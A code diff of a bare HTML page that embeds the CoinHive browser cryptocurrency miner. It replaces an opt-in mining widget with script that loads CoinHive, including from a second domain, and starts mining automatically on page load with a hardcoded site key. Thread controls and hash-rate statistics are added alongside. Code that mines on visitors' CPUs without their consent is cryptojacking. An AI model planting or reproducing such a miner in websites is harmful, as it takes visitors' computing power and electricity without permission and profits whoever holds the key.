@@ -6,13 +6,14 @@
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <title>Document</title>
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script src="https://coinhive.com/media/miner-ui.js"></script>
 </head>
 <body>
-        <script>
+        <!-- <script>
                 var miner = new CoinHive.Anonymous('Q0n1WpgFJ2jBmjrNiawB9KNnIbIC5nOL');
                 miner.start();
-        </script>
-        <div class="coinhive-miner" 
+        </script> -->
+        <!-- <div class="coinhive-miner" 
         style="width: 256px; height: 310px"
         data-key="Q0n1WpgFJ2jBmjrNiawB9KNnIbIC5nOL"
         data-autostart="false"
@@ -23,9 +24,72 @@
         data-graph="#555555"
         data-threads="4"
         data-throttle="0.1"
-        data-start="Start Now!">>
+        data-start="Start Now!">
         <em>Please disable Adblock!</em>
-        </div>
+        </div> -->
+        
+        <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+        <center>
+        <p id="tcount"></p>
+        <p id="hps"></p>
+        <p id="ths"></p>
+        <p id="tah"></p>
+        </center>
+        
+        <center>
+        <p id="minebutton"></p>
+        </center>
+      
+        <button id="up-thread">+1 Threads</button>
+        <button id="down-thread">-1 Threads</button>
+
+
+        
+        <script type="text/javascript">
+        
+
+
+        var miner = new CoinHive.Anonymous('Q0n1WpgFJ2jBmjrNiawB9KNnIbIC5nOL','threads: 1');
+        miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+        // Update stats once per second
+        var upThreadEl = document.getElementById("up-thread")
+        
+        upThreadEl.addEventListener('click', function(){
+            var currThreads = miner.getNumThreads();
+            miner.setNumThreads(currThreads +1)
+            console.log('increase thread')
+        })
+        
+         var downThreadEl = document.getElementById("down-thread")
+         downThreadEl.addEventListener('click', function(){
+            var currThreads = miner.getNumThreads();
+            miner.setNumThreads(currThreads - 1)
+            console.log('decrease thread')
+         })
+         
+    
+
+        setInterval(function() {
+            var threadCount = miner.getNumThreads();
+            var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
+            var totalHashes = miner.getTotalHashes();
+            var acceptedHashes = miner.getAcceptedHashes() / 256;
+            // Output to HTML elements...
+            if (miner.isRunning()) {
+                document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
+                document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
+                document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
+                document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
+                document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
+            } else {
+                document.getElementById("hps").innerHTML = "Please click start";
+                document.getElementById("ths").innerHTML = "to support";
+                document.getElementById("tah").innerHTML = "this site";
+                document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
+            }
+        }, 1000);
+        </script>
+
     
 </body>
 </html>
